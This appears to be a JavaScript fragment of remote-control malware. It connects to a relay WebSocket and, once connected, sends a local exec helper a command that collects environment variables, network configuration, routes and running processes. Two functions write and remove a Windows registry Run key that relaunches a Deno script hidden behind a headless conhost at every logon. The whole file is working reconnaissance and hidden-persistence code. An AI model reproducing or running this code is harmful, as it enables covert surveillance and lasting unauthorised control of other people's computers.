const ws = new WebSocket("wss://relay.acme.invalid/socket");
const helper = "http://127.0.0.1:10021/exec";

ws.onopen = async () => {
  await fetch(helper, {
    method: "POST",
    body: JSON.stringify({ command: "set && ipconfig /all && route print && tasklist" }),
  });
};

async function installPersistence(denoPath, workingDirectory) {
  const command =
    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WorkerStartup /t REG_SZ /d "conhost.exe --headless ' +
    denoPath +
    ' --allow-run ' +
    workingDirectory +
    'app.js" /f';
  return fetch(helper, {
    method: "POST",
    body: JSON.stringify({ command }),
  });
}

async function removePersistence() {
  return fetch(helper, {
    method: "POST",
    body: JSON.stringify({
      command: 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WorkerStartup /f',
    }),
  });
}
